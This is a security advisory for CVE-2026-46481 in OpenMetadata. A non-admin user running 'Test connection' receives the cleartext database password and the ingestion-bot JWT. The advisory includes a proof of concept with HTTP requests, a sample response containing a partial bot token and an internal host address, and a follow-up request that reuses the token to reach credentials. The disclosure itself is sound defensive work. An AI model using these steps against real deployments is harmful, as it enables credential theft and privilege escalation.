# [H] OpenMetadata: TEST_CONNECTION workflow leaks ingestion-bot JWT and database password to regular users

## Summary
Severity: High
Advisory: GHSA-9vmh-whc4-7phg
CVE: CVE-2026-46481
CWE: CWE-201
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-9vmh-whc4-7phg
Type: github-advisory

## Affected
- Maven: `org.open-metadata:openmetadata-service` — affected >=0 <1.12.4

## Details
**This is not applicable if an application is configuring the Secrets Store to store credentials. Please make sure to follow the best practices when deploying in production**
In OpenMetadata 1.12.1, a non-admin SSO user can trigger a `TEST_CONNECTION` workflow for a Database Service and receive, in the HTTP 201 response of `POST /api/v1/automations/workflows`, both:

- The cleartext database password in `request.connection.config.password`.
- The ingestion bot JWT in `openMetadataServerConnection.securityConfig.jwtToken`.

The leaked ingestion-bot token can then be reused as `Authorization: Bearer <jwt>` to access sensitive service APIs (for example, `GET /api/v1/services/databaseServices/{id}?include=all`) with bot-level privileges.

This looks different from GHSA-pqqf-7hxm-rj5r, because it affects the `automations/workflows` TEST_CONNECTION endpoint on OpenMetadata 1.12.1, not the ingestion pipelines endpoints.

---

Version / Product

- Product: OpenMetadata (open source, Apache 2.0)
- Version: 1.12.1
  - GET /api/v1/system/version →
    {"version":"1.12.1","revision":"618a2dc2ec8f70ffcd0378ee14ce92cb4f98f0c5"}
- Deployment: OpenMetadata server with SSO via Azure AD (OAuth), Oracle database service, secrets in DB secrets manager (`secretsManagerProvider: "db"`).

---

Preconditions

- Authenticated SSO user with access to the UI.
- User can open a Database Service and click “Test connection”.
- No server admin role, no shell/DB access.

---

PoC (short)

1) Login as a regular SSO user.

2) In the UI go to:
   Settings → Services → Database Services → utplrac_scan2_srvetel  
   Open the connection tab and click “Test connection”.

3) The browser sends:

POST /api/v1/automations/workflows HTTP/1.1
Host: catalogodatos-test.utpl.edu.ec
Authorization: Bearer <Azure_AD_user_JWT>
Content-Type: application/json

{
  "name": "test-connection-Oracle-XXXX",
  "workflowType": "TEST_CONNECTION",
  "request": {
    "connection": {
      "config": {
        "type": "Oracle",
        "scheme": "oracle+cx_oracle",
        "username": "qpro_gobierno_datos",
        "password": "********",
        "hostPort": "172.16.54.32:1521",
        ...
      }
    },
    "serviceType": "Database",
    "connectionType": "Oracle",
    "serviceName": "utplrac_scan2_srvetel"
  }
}

Note: in the request the password is masked as "********".

4) The server responds with HTTP 201 and a body similar to:

{
  "id": "5acd06f0-0db6-43b9-b0e0-e1574479bba7",
  "workflowType": "TEST_CONNECTION",
  "request": {
    "connection": {
      "config": {
        "type": "Oracle",
        "scheme": "oracle+cx_oracle",
        "username": "qpro_gobierno_datos",
        "password": "<REAL_PASSWORD_HERE>",
        "hostPort": "172.16.54.32:1521",
        ...
      }
    },
    "serviceType": "Database",
    "connectionType": "Oracle",
    "serviceName": "utplrac_scan2_srvetel",
    "secretsManagerProvider": "db"
  },
  "openMetadataServerConnection": {
    "type": "OpenMetadata",
    "hostPort": "http://openmetadata-server:8585/api",
    "authProvider": "openmetadata",
    "securityConfig": {
      "jwtToken": "eyJraWQiOiJHYjM4OWEtOWY3Ni1nZGpzLWE5MmotMDI0MmJrOTQzNTYiLCJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJvcGVuLW1ldGFkYXRhLm9yZyIsInN1YiI6ImluZ2VzdGlvbi1ib3QiLCJyb2xlcyI6WyJJbmdlc3Rpb25Cb3RSb2xlIl0sImVtYWlsIjoiaW5nZXN0aW9uLWJvdEBvcGVuLW1ldGFkYXRhLm9yZyIsImlzQm90Ijp0cnVlLCJ0b2tlblR5cGUiOiJCT1QiLCJ1c2VybmFtZSI6ImluZ2VzdGlvbi1ib3QiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJpbmdlc3Rpb24tYm90IiwiaWF0IjoxNzc0MDI2Nzg3LCJleHAiOjE3ODE4MDI3ODd9.DHLw4s..."
    },
    ...
  },
  "updatedBy": "<regular_user>",
  ...
}

Key points:
- request.connection.config.password now contains the real Oracle DB password in cleartext.
- openMetadataServerConnection.securityConfig.jwtToken contains a valid JWT for the ingestion-bot account (sub = "ingestion-bot", tokenType = "BOT").

5) Reuse the leaked ingestion-bot JWT:

GET /api/v1/services/databaseServices/f0382c0b-149e-4ca5-8844-d636c3437b9d?include=all HTTP/1.1
Host: catalogodatos-test.utpl.edu.ec
Authorization: Bearer <leaked_ingestion-bot_JWT>
Accept: application/json

The API returns the full database service including username and password, confirming bot-level access.

---

Impact / Severity

- Any user who can run “Test connection” on a database service can:
  - Recover the cleartext DB credentials.
  - Recover a long‑lived ingestion-bot JWT.
  - Act as ingestion-bot against the OpenMetadata API and access/modify services and metadata.

**
<img width="1256" height="653" alt="LOWLEVELTOKEN" src="https://github.com/user-attachments/assets/e5b45edb-be51-493a-b4d0-25175cdf7cbc" />
<img width="194" height="339" alt="USERROL" src="https://github.com/user-attachments/assets/04005616-4c7b-4b27-90f6-a8e1a974712b" />
<img width="972" height="389" alt="CLEARPOC" src="https://github.com/user-attachments/assets/fdb26b59-782e-4a6b-a595-cdfb7ea68984" />**

## References
- https://github.com/open-metadata/OpenMetadata/security/advisories/GHSA-9vmh-whc4-7phg
- https://nvd.nist.gov/vuln/detail/CVE-2026-46481
- https://github.com/open-metadata/OpenMetadata
